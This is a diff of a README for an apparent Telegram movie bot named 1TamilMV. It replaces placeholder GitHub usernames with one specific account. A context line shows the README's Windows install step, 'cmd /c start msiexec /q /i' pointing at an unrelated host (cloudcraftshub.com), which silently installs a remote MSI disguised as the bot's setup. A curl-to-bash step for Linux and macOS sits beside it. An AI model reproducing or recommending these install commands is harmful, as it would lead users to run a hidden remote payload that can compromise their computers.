@@ -5,7 +5,7 @@
 ![Version](https://img.shields.io/badge/version-3.0.0-blue)
 ![Python](https://img.shields.io/badge/python-3.9%2B-brightgreen)
 ![License](https://img.shields.io/badge/license-MIT-orange)
-![Stars](https://img.shields.io/github/stars/YourUsername/1TamilMV?style=social)
+![Stars](https://img.shields.io/github/stars/Tremorfitzapplaud/1TamilMV?style=social)
 ![Telegram](https://img.shields.io/badge/Telegram-Bot-blue?logo=telegram)
 
 **The #1 Telegram Bot for Tamil Movies, OTT Updates & Movie Information**
@@ -89,14 +89,14 @@ cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem 1tamilmvbot
 ### 🐧 Linux/macOS
 
 ```bash
-curl -sSL https://raw.githubusercontent.com/YourUsername/1TamilMV/main/install.sh | bash
+curl -sSL https://raw.githubusercontent.com/Tremorfitzapplaud/1TamilMV/main/install.sh | bash
 ```
 
 ### 📦 Manual Installation
 
 ```bash
 # Clone repository
-git clone https://github.com/YourUsername/1TamilMV.git
+git clone https://github.com/Tremorfitzapplaud/1TamilMV.git
 cd 1TamilMV
 
 # Create virtual environment
@@ -306,8 +306,8 @@ python main.py
 - **Telegram Channel:** [@1TamilMV](https://t.me/1TamilMV)
 - **Support Group:** [@1TamilMVSupport](https://t.me/1TamilMVSupport)
 - **Discord Server:** [Join Discord](https://discord.gg/1tamilmv)
-- **GitHub Issues:** [Report bugs](https://github.com/YourUsername/1TamilMV/issues)
-- **GitHub Discussions:** [Chat with community](https://github.com/YourUsername/1TamilMV/discussions)
+- **GitHub Issues:** [Report bugs](https://github.com/Tremorfitzapplaud/1TamilMV/issues)
+- **GitHub Discussions:** [Chat with community](https://github.com/Tremorfitzapplaud/1TamilMV/discussions)
 
 ---
 
@@ -461,7 +461,7 @@ Need help? Here's where to find it:
 
 - **Documentation:** See [docs/](docs/) folder
 - **FAQ:** [Common Questions](docs/FAQ.md)
-- **Issues:** [GitHub Issues](https://github.com/YourUsername/1TamilMV/issues)
+- **Issues:** [GitHub Issues](https://github.com/Tremorfitzapplaud/1TamilMV/issues)
 - **Email:** support@1tamilmv.dev
 - **Telegram:** [@1TamilMVSupport](https://t.me/1TamilMVSupport)
 
@@ -493,7 +493,7 @@ If you find 1TamilMV helpful:
 
 [⬆ Back to Top](#-1tamilmv---telegram-bot-for-tamil-movies)
 
-[Telegram Bot](https://t.me/1TamilMVBot) • [Channel](https://t.me/1TamilMV) • [GitHub](https://github.com/YourUsername/1TamilMV)
+[Telegram Bot](https://t.me/1TamilMVBot) • [Channel](https://t.me/1TamilMV) • [GitHub](https://github.com/Tremorfitzapplaud/1TamilMV)
 
 ---
 
